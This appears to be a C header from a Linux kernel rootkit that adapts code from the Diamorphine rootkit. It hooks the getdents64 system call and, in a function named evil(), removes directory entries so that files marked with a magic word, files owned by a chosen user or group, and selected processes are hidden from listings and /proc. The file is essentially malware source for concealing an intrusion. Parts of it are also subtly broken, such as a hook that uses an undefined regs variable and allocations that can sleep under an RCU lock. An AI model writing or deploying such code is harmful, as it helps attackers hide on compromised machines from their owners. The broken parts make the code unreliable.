/**
The evil() method contains code for linux_direnet element removal from https://github.com/m0nad/Diamorphine,
see https://github.com/m0nad/Diamorphine/blob/master/LICENSE.txt for further details about license.
 */

#pragma once

#include "rootkit.h"
#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>
#include <linux/mm.h>
#include <linux/sched/mm.h>
#include <linux/pid.h>
#include <linux/dcache.h>
#include <linux/path.h>
#include <linux/limits.h>


extern char* MAGIC_WORD;
extern char* HIDE_PROCESS_EXE;
extern char* HIDE_PROCESS_CMDLINE;

/* Just so we know what the linux_dirent looks like.
   actually defined in fs/readdir.c
   exported in linux/syscalls.h
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};
*/

// Function to check if a process should be hidden based on exe or cmdline
int should_hide_process(const char* proc_name) {
	struct task_struct *task;
	struct file *exe_file;
	char *exe_path = NULL;
	char *cmdline = NULL;
	char *path_buf = NULL;
	int should_hide = 0;
	int pid;
	
	// Check if this is a /proc/PID directory
	if (strncmp(proc_name, "/proc/", 6) == 0) {
		// Extract PID from proc_name (skip "/proc/")
		if (kstrtoint(proc_name + 6, 10, &pid) != 0) {
			return 0; // Not a valid PID directory
		}
	} else {
		// Check if it's just a PID (when listing /proc directly)
		if (kstrtoint(proc_name, 10, &pid) != 0) {
			return 0; // Not a PID
		}
	}
	
	// Find the task by PID
	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return 0;
	}
	
	// Get the executable path
	task_lock(task);
	exe_file = task->mm ? task->mm->exe_file : NULL;
	if (exe_file) {
		get_file(exe_file);
		task_unlock(task);
		
		path_buf = kmalloc(PATH_MAX, GFP_KERNEL);
		if (path_buf) {
			exe_path = d_path(&exe_file->f_path, path_buf, PATH_MAX);
			if (!IS_ERR(exe_path)) {
				// Check if executable path matches
				if (HIDE_PROCESS_EXE && strstr(exe_path, HIDE_PROCESS_EXE)) {
					should_hide = 1;
				}
			}
		}
		fput(exe_file);
	} else {
		task_unlock(task);
	}
	
	// Check command line if not already hiding
	if (!should_hide && HIDE_PROCESS_CMDLINE) {
		struct mm_struct *mm = task->mm;
		if (mm) {
			cmdline = kmalloc(PAGE_SIZE, GFP_KERNEL);
			if (cmdline) {
				int len = 0;
				char *p = cmdline;
				
				// Read command line from task
				if (mm->arg_start && mm->arg_end) {
					len = mm->arg_end - mm->arg_start;
					if (len > PAGE_SIZE - 1)
						len = PAGE_SIZE - 1;
					
					if (access_process_vm(task, mm->arg_start, cmdline, len, 0) == len) {
						cmdline[len] = '\0';
						// Replace null bytes with spaces for easier matching
						for (int i = 0; i < len; i++) {
							if (cmdline[i] == '\0')
								cmdline[i] = ' ';
						}
						
						if (strstr(cmdline, HIDE_PROCESS_CMDLINE)) {
							should_hide = 1;
						}
					}
				}
			}
		}
	}
	
	rcu_read_unlock();
	
	// Cleanup
	if (path_buf)
		kfree(path_buf);
	if (cmdline)
		kfree(cmdline);
		
	return should_hide;
}

int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {
	int err;
	unsigned long off = 0;
	struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
	int user;
	int group;
	struct linux_dirent64 *dir, *kdir, *kdirent, *prev = NULL;

	kdirent = kzalloc(res, GFP_KERNEL);
	if (kdirent == NULL){
		//printk(KERN_DEBUG "kzalloc failed\n");
		return res;
	}

	err = copy_from_user(kdirent, dirent, res);
	if (err){
		//printk(KERN_DEBUG "can not copy from user!\n");
		goto out;
	}

	int (*vfs_fstatat_ptr)(int, const char __user *, struct kstat *, int) = (int (*)(int, const char __user *, struct kstat *, int))lookup_name("vfs_fstatat");

	//printk(KERN_DEBUG "vfs_fstatat_ptr is at %lx\n", vfs_fstatat_ptr);

	while (off < res) {
		kdir = (void *)kdirent + off;
		dir = (void *)dirent + off;
		err = vfs_fstatat_ptr(fd, dir->d_name, stat, 0);
		if (err){
			//printk(KERN_DEBUG "can not read file attributes!\n");
			goto out;
		}
		user = (int)stat->uid.val;
		group = (int)stat->gid.val;
		if (strstr(kdir->d_name, MAGIC_WORD)
			|| user == USER_HIDE
			|| group == GROUP_HIDE
			|| should_hide_process(kdir->d_name)) {
			if (kdir == kdirent) {
				res -= kdir->d_reclen;
				memmove(kdir, (void *)kdir + kdir->d_reclen, res);
				continue;
			}
			prev->d_reclen += kdir->d_reclen;
		} else {
			prev = kdir;
		}
		off += kdir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, res);
	if (err){
		//printk(KERN_DEBUG "can not copy back to user!\n");
		goto out;
	}
	out:
		kfree(stat);
		kfree(kdirent);
	return res;
}
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs*);

static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
	struct linux_dirent __user *dirent = SECOND_ARG(regs, struct linux_dirent __user *);
	unsigned int fd = FIRST_ARG(regs, unsigned int);
	int res;
	
	res = orig_sys_getdents64(regs);


	if (res <= 0){
		// The original getdents failed - we aint mangling with that.
		return res;
	}

	res = evil(dirent, res, fd);
	
	return res;
}
#else
static asmlinkage long (*orig_sys_getdents64)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);

static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int res;
	
	res = orig_sys_getdents64(regs);


	if (res <= 0){
		// The original getdents failed - we aint mangling with that.
		return res;
	}

	res = evil(dirent, res, fd);
	
	return res;
}
#endif
